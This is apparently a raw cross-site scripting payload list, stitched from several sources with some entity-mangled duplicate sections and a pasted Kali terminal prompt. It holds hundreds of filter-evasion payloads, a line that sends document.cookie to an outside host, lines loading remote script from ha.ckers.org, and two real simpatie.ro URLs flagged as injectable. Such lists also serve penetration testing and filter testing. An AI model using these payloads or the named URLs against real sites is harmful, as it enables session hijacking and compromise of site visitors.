<script>alert(1337)</script><marquee><h1>XSS by xss</h1></marquee>
"><script>alert(1337)</script>"><script>alert("XSS by \nxss</h1></marquee>
'"></title><script>alert(1337)</script>><marquee><h1>XSS by xss</h1></marquee>
<iframe src="javascript:alert('XSS by \nxss');"></iframe><marquee><h1>XSS by xss</h1></marquee>
http://www.simpatie.ro/index.php?page=friends&member=781339&javafunctionname=Pageclick&javapgno=2 javapgno=2 ??XSS??
http://www.simpatie.ro/index.php?page=top_movies&cat=13&p=2 p=2 ??XSS??
<SCRIPT> alert(“XSS”); </SCRIPT>
<BODY ONLOAD=alert("XSS")>
<BODY BACKGROUND="javascript:alert('XSS')">
<IMG SRC="javascript:alert('XSS');">
<IMG DYNSRC="javascript:alert('XSS')">
<IMG LOWSRC="javascript:alert('XSS')">
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<TABLE BACKGROUND="javascript:alert('XSS')">
<TD BACKGROUND="javascript:alert('XSS')">
<DIV STYLE="background-image: url(javascript:alert('XSS'))">
<DIV STYLE="width: expression(alert('XSS'));">
&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()}
&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;
&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;BODY BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;
&lt;DIV STYLE=&quot;background-image: url(javascript:alert(&apos;XSS&apos;))&quot;&gt;
&lt;DIV STYLE=&quot;background-image: url(&amp;#1;javascript:alert(&apos;XSS&apos;))&quot;&gt;
&lt;DIV STYLE=&quot;width: expression(alert(&apos;XSS&apos;));&quot;&gt;
&lt;FRAMESET&gt;&lt;FRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/FRAMESET&gt;
&lt;IFRAME SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;&lt;/IFRAME&gt;
&lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=javascript:alert(&apos;XSS&apos;)&gt;
&lt;IMG DYNSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG LOWSRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
&lt;STYLE&gt;li {list-style-image: url(&quot;javascript:alert(&#39;XSS&#39;)&quot;);}&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS
&lt;IMG SRC=&apos;vbscript:msgbox(&quot;XSS&quot;)&apos;&gt;
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389&gt;&lt;param name=url value=javascript:alert(&apos;XSS&apos;)&gt;&lt;/OBJECT&gt;
a=&quot;get&quot;;&amp;#10;b=&quot;URL(&quot;&quot;;&amp;#10;c=&quot;javascript:&quot;;&amp;#10;d=&quot;alert(&apos;XSS&apos;);&quot;)&quot;;&#10;eval(a+b+c+d);
&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;
&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;
&lt;XSS STYLE=&quot;xss:expression(alert(&apos;XSS&apos;))&quot;&gt;
&lt;STYLE&gt;.XSS{background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;
&lt;STYLE type=&quot;text/css&quot;&gt;BODY{background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)}&lt;/STYLE&gt;
&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;TABLE BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TABLE&gt;
&lt;TABLE&gt;&lt;TD BACKGROUND=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/TD&gt;&lt;/TABLE&gt;
&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;IMG SRC=&quot;javas]]&gt;&lt;![CDATA[cript:alert(&apos;XSS&apos;);&quot;&gt;]]&gt;
&lt;XML ID=&quot;xss&quot;&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=&quot;javas&lt;!-- --&gt;cript:alert(&apos;XSS&apos;)&quot;&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;
&lt;META HTTP-EQUIV=&quot;Set-Cookie&quot; Content=&quot;USERID=&lt;SCRIPT&gt;alert(&apos;XSS&apos;)&lt;/SCRIPT&gt;&quot;&gt;
&lt;XSS STYLE=&quot;behavior: url(http://ha.ckers.org/xss.htc);&quot;&gt;
&lt;BR SIZE=&quot;&amp;{alert(&apos;XSS&apos;)}&quot;&gt;
&lt;IMG SRC=JaVaScRiPt:alert(&apos;XSS&apos;)&gt;
&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt;
&lt;IMG SRC=`javascript:alert(&quot;RSnake says, &apos;XSS&apos;&quot;)`&gt;
&lt;HEAD&gt;&lt;META HTTP-EQUIV=&quot;CONTENT-TYPE&quot; CONTENT=&quot;text/html; charset=UTF-7&quot;&gt; &lt;/HEAD&gt;+ADw-SCRIPT+AD4-alert(&apos;XSS&apos;);+ADw-/SCRIPT+AD4-
\&quot;;alert(&apos;XSS&apos;);//
&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;
&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;
&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;
perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;
&lt;SCRIPT/XSS SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;
&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;
&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;
&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;
&lt;SCRIPT&gt;a=/XSS/
&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;
&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;
<script>a=/XSS/\ndocument.vulnerable=true;</script>
<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
<XSS STYLE="xss:expression(document.vulnerable=true)">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;
&lt;br size=\&quot;&amp;{alert(&#039;XSS&#039;)}\&quot;&gt;
perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out
perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS STYLE=xss:expression(alert('XSS'))>
"><script>alert('XSS')</script>
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS STYLE=xss:e/**/xpression(alert('XSS'))>
</XSS STYLE=xss:expression(alert('XSS'))>
';';;!--";<;XSS>;=&;{()}
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;
<;BASE HREF=";javascript:alert(';XSS';);//";>;
<;BGSOUND SRC=";javascript:alert(';XSS';);";>;
<;BODY BACKGROUND=";javascript:alert(';XSS';);";>;
<;BODY ONLOAD=alert(';XSS';)>;
<;DIV STYLE=";background-image: url(javascript:alert(';XSS';))";>;
<;DIV STYLE=";background-image: url(&;#1;javascript:alert(';XSS';))";>;
<;DIV STYLE=";width: expression(alert(';XSS';));";>;
<;FRAMESET>;<;FRAME SRC=";javascript:alert(';XSS';);";>;<;/FRAMESET>;
<;IFRAME SRC=";javascript:alert(';XSS';);";>;<;/IFRAME>;
<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';XSS';);";>;
<;IMG SRC=";javascript:alert(';XSS';);";>;
<;IMG SRC=javascript:alert(';XSS';)>;
<;IMG DYNSRC=";javascript:alert(';XSS';);";>;
<;IMG LOWSRC=";javascript:alert(';XSS';);";>;
exp/*<;XSS STYLE=';no\xss:noxss(";*//*";);
<;STYLE>;li {list-style-image: url(";javascript:alert(&#39;XSS&#39;)";);}<;/STYLE>;<;UL>;<;LI>;XSS
<;IMG SRC=';vbscript:msgbox(";XSS";)';>;
<;META HTTP-EQUIV=";refresh"; CONTENT=";0;url=javascript:alert(';XSS';);";>;
<;META HTTP-EQUIV=";refresh"; CONTENT=";0; URL=http://;URL=javascript:alert(';XSS';);";>;
<;OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389>;<;param name=url value=javascript:alert(';XSS';)>;<;/OBJECT>;
a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d);
<;STYLE TYPE=";text/javascript";>;alert(';XSS';);<;/STYLE>;
<;IMG STYLE=";xss:expr/*XSS*/ession(alert(';XSS';))";>;
<;XSS STYLE=";xss:expression(alert(';XSS';))";>;
<;STYLE>;.XSS{background-image:url(";javascript:alert(';XSS';)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
<;STYLE type=";text/css";>;BODY{background:url(";javascript:alert(';XSS';)";)}<;/STYLE>;
<;LINK REL=";stylesheet"; HREF=";javascript:alert(';XSS';);";>;
<;TABLE BACKGROUND=";javascript:alert(';XSS';)";>;<;/TABLE>;
<;TABLE>;<;TD BACKGROUND=";javascript:alert(';XSS';)";>;<;/TD>;<;/TABLE>;
<;XML ID=I>;<;X>;<;C>;<;![CDATA[<;IMG SRC=";javas]]>;<;![CDATA[cript:alert(';XSS';);";>;]]>;
<;XML ID=";xss";>;<;I>;<;B>;<;IMG SRC=";javas<;!-- -->;cript:alert(';XSS';)";>;<;/B>;<;/I>;<;/XML>;
<;META HTTP-EQUIV=";Set-Cookie"; Content=";USERID=<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;";>;
<;XSS STYLE=";behavior: url(http://ha.ckers.org/xss.htc);";>;
<;BR SIZE=";&;{alert(';XSS';)}";>;
<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;
<;IMG SRC=javascript:alert(&;quot;XSS&;quot;)>;
<;IMG SRC=`javascript:alert(";RSnake says, ';XSS';";)`>;
<;HEAD>;<;META HTTP-EQUIV=";CONTENT-TYPE"; CONTENT=";text/html; charset=UTF-7";>; <;/HEAD>;+ADw-SCRIPT+AD4-alert(';XSS';);+ADw-/SCRIPT+AD4-
\";;alert(';XSS';);//
<;/TITLE>;<;SCRIPT>;alert("XSS");<;/SCRIPT>;
<;STYLE>;@im\port';\ja\vasc\ript:alert(";XSS";)';;<;/STYLE>;
<;IMG SRC=";jav&#x09;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x09;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x0A;ascript:alert(';XSS';);";>;
<;IMG SRC=";jav&;#x0D;ascript:alert(';XSS';);";>;
perl -e ';print ";<;IM SRC=java\0script:alert(";XSS";)>";;';>; out
perl -e ';print ";&;<;SCR\0IPT>;alert(";XSS";)<;/SCR\0IPT>;";;'; >; out
<;IMG SRC="; &;#14;  javascript:alert(';XSS';);";>;
<;SCRIPT/XSS SRC=";http://ha.ckers.org/xss.js";>;<;/SCRIPT>;
<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
<;IMG SRC=";javascript:alert(';XSS';)";
<;<;SCRIPT>;alert(";XSS";);//<;<;/SCRIPT>;
<;IMG ";";";>;<;SCRIPT>;alert(";XSS";)<;/SCRIPT>;";>;
<;SCRIPT>;a=/XSS/
<;A HREF=";http://66.102.7.147/";>;XSS<;/A>;
<;A HREF=";http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D";>;XSS<;/A>;
<;A HREF=";http://1113982867/";>;XSS<;/A>;
<;A HREF=";http://0x42.0x0000066.0x7.0x93/";>;XSS<;/A>;
<;A HREF=";http://0102.0146.0007.00000223/";>;XSS<;/A>;
<;A HREF=";h&#x0A;tt&#09;p://6&;#09;6.000146.0x7.147/";>;XSS<;/A>;
<;A HREF=";//www.google.com/";>;XSS<;/A>;
<;A HREF=";//google";>;XSS<;/A>;
<;A HREF=";http://ha.ckers.org@google";>;XSS<;/A>;
<;A HREF=";http://google:ha.ckers.org";>;XSS<;/A>;
<;A HREF=";http://google.com/";>;XSS<;/A>;
<;A HREF=";http://www.google.com./";>;XSS<;/A>;
<;A HREF=";javascript:document.location=';http://www.google.com/';";>;XSS<;/A>;
<;A HREF=";http://www.gohttp://www.google.com/ogle.com/";>;XSS<;/A>;
<script>a=/XSS/\ndocument.vulnerable=true;</script>
<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
<img STYLE="xss:expr/*XSS*/ession(document.vulnerable=true)">
<XSS STYLE="xss:expression(document.vulnerable=true)">
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
<html><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>"></BODY></html>
<HTML xmlns:xss><?import namespace="xss" implementation="http://www.securitycompass.com/xss.htc"><xss:xss>XSS</xss:xss></html>
";>;<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert(";XSS";)>;
<;br size=\";&;{alert(&#039;XSS&#039;)}\";>;
perl -e &#039;print \";<;IMG SRC=java\0script:alert(\";XSS\";)>;\";;&#039; >; out
perl -e &#039;print \";<;SCR\0IPT>;alert(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS STYLE=xss:expression(alert('XSS'))>
"><script>alert('XSS')</script>
</XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
XSS STYLE=xss:e/**/xpression(alert('XSS'))>
</XSS STYLE=xss:expression(alert('XSS'))>
>"><script>alert("XSS")</script>&
"><STYLE>@import"javascript:alert('XSS')";</STYLE>
>"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>
'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
'';!--"<XSS>=&{()}
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
<IMG SRC="jav&#x0D;ascript:alert(<WBR>'XSS');">
<script>alert('XSS')</script>
%3cscript%3ealert('XSS')%3c/script%3e
%22%3e%3cscript%3ealert('XSS')%3c/script%3e
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=javascript:alert('XSS')>       
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
<IMG SRC="jav ascript:alert('XSS');">
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<BODY BACKGROUND="javascript:alert('XSS')">
<BODY ONLOAD=alert('XSS')>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<IMG SRC="javascript:alert('XSS')"
<<SCRIPT>alert("XSS");//<</SCRIPT>
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/home/kali]
└─# grep -w 1 -F xss.txt
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
'`"><\x3Cscript>javascript:alert(1)</script>        
'`"><\x00script>javascript:alert(1)</script>
<img src=1 href=1 onerror="javascript:alert(1)"></img>
<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<body src=1 href=1 onerror="javascript:alert(1)"></body>
<image src=1 href=1 onerror="javascript:alert(1)"></image>
<object src=1 href=1 onerror="javascript:alert(1)"></object>
<script src=1 href=1 onerror="javascript:alert(1)"></script>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
<script onReadyStateChange script onReadyStateChange="javascript:javascript:alert(1)"></script onReadyStateChange>
<html onMouseUp html onMouseUp="javascript:javascript:alert(1)"></html onMouseUp>
<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
<html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"></html onMouseLeave>
<html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"></html onMouseWheel>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"></iframe onReadyStateChange>
<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
<script onLoad script onLoad="javascript:javascript:alert(1)"></script onLoad>
<html onMouseOver html onMouseOver="javascript:javascript:alert(1)"></html onMouseOver>
<html onMouseEnter html onMouseEnter="javascript:parent.javascript:alert(1)"></html onMouseEnter>
<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
<html onMouseDown html onMouseDown="javascript:javascript:alert(1)"></html onMouseDown>
<marquee onScroll marquee onScroll="javascript:javascript:alert(1)"></marquee onScroll>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<html onMouseOut html onMouseOut="javascript:javascript:alert(1)"></html onMouseOut>
<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
<object onError object onError="javascript:javascript:alert(1)"></object onError>
<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
<html onMouseMove html onMouseMove="javascript:javascript:alert(1)"></html onMouseMove>
<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
<iframe onload iframe onload="javascript:javascript:alert(1)"></iframe onload>
<body onload body onload="javascript:javascript:alert(1)"></body onload>
<html onmouseover html onmouseover="javascript:javascript:alert(1)"></html onmouseover>
<object onbeforeload object onbeforeload="javascript:javascript:alert(1)"></object onbeforeload>
<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
<iframe onbeforeload iframe onbeforeload="javascript:javascript:alert(1)"></iframe onbeforeload>
<iframe src iframe src="javascript:javascript:alert(1)"></iframe src>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<html onmousemove html onmousemove="javascript:javascript:alert(1)"></html onmousemove>
<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
\x3Cscript>javascript:alert(1)</script>
'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
<script>javascript:alert(1)</script\x0D
<script>javascript:alert(1)</script\x0A
<script>javascript:alert(1)</script\x0B
<script charset="\x22>javascript:alert(1)</script>
<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x21> <img src=xxx:x onerror=javascript:alert(1)> -->
--><!-- --\x3E> <img src=xxx:x onerror=javascript:alert(1)> -->
`"'><img src='#\x27 onerror=javascript:alert(1)>
<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
"'`><p><svg><script>a='hello\x27;javascript:alert(1)//';</script></p>
<a href="javas\x00cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x07cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x08cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x02cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x03cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x04cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x01cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x05cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x09cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x06cript:javascript:alert(1)" id="fuzzelement1">test</a>
<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
<script>/* *\x2A/javascript:alert(1)// */</script>
<script>/* *\x00/javascript:alert(1)// */</script>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
<script>if("x\\xE1\x96\x89".length==2) { javascript:alert(1);}</script>
<script>if("x\\xE0\xB9\x92".length==2) { javascript:alert(1);}</script>
<script>if("x\\xEE\xA9\x93".length==2) { javascript:alert(1);}</script>
'`"><\x3Cscript>javascript:alert(1)</script>
'`"><\x00script>javascript:alert(1)</script>
"'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
"'`><\x00img src=xxx:x onerror=javascript:alert(1)>
<script src="data:text/plain\x2Cjavascript:alert(1)"></script>
<script src="data:\xD4\x8F,javascript:alert(1)"></script>
<script src="data:\xE0\xA4\x98,javascript:alert(1)"></script>
<script src="data:\xCB\x8F,javascript:alert(1)"></script>
<script\x20type="text/javascript">javascript:alert(1);</script>
<script\x3Etype="text/javascript">javascript:alert(1);</script>
<script\x0Dtype="text/javascript">javascript:alert(1);</script>
<script\x09type="text/javascript">javascript:alert(1);</script>
<script\x0Ctype="text/javascript">javascript:alert(1);</script>
<script\x2Ftype="text/javascript">javascript:alert(1);</script>
<script\x0Atype="text/javascript">javascript:alert(1);</script>
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
